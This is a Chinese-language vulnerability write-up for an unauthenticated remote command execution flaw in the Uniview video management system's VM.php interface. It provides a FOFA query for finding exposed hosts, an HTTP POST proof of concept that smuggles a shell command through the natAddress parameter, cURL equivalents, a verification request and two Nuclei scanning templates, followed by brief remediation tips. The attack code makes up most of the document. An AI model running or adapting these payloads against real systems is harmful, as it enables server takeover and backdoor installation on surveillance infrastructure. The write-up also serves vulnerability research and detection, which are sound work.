# 浙江宇视视频管理系统 VM.php 远程命令执行漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 浙江宇视视频管理系统 VM.php 远程命令执行漏洞 |
| 漏洞类型 | RCE（远程命令执行） |
| 影响组件 | 浙江宇视视频管理系统 |
| 影响版本 | 通用版本 |

## 漏洞概述

浙江宇视科技有限公司（uniview），是全球AIoT产品、解决方案与全栈式能力提供商。浙江宇视视频管理系统VM.php接口存在远程命令执行漏洞，未经身份认证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

## FOFA查询语句

```
body="/Script/Public/Language.js.php"
```

## 漏洞复现

### POC

```http
POST /Interface/DevManage/VM.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

cmd=setNatConfig&natAddress=%26echo%20d1536gs9fpwk%20>d2w6w9opj3g.txt
```

#### cURL
```bash
# 写入文件
curl -X POST "http://target/Interface/DevManage/VM.php" \
  -d "cmd=setNatConfig&natAddress=%26echo%20test%20>shell.txt"

# 访问写入的文件
curl "http://target/d2w6w9opj3g.txt"
```

#### 验证POC
```http
GET /Interface/DevManage/d2w6w9opj3g.txt HTTP/1.1
Host: target
Cookie: PHPSESSID=59e0456dddc487ca02ced9cd034b8d3e
```

#### 特征
- 写入的文件名：`d2w6w9opj3g.txt`（随机名）

#### Nuclei
```yaml
id: uniview-vm-rce

info:
  name: Uniview VM PHP RCE
  author: security-researcher
  severity: critical
  description: Uniview Video Management System VM.php Remote Code Execution

requests:
  - method: POST
    path:
      - "{{BaseURL}}/Interface/DevManage/VM.php"
    body: "cmd=setNatConfig&natAddress=%26echo%20test{{randstr}}%20>{{randstr}}.txt"
    matchers:
      - type: word
        words:
          - "{{randstr}}"
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限


## Nuclei 检测脚本

```yaml
﻿id: uniview-vm-rce

info:
  name: Uniview VM PHP RCE
  author: security-researcher
  severity: critical
  description: Uniview Video Management System VM.php Remote Code Execution
  reference: https://blog.wuyaoxuexi.cn

requests:
  - method: POST
    path:
      - "{{BaseURL}}/Interface/DevManage/VM.php"
    body: "cmd=setNatConfig&natAddress=%26echo%20uniview{{randint}}%20>uniview{{randint}}.txt"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uniview"
      - type: status
        status:
          - 200



```
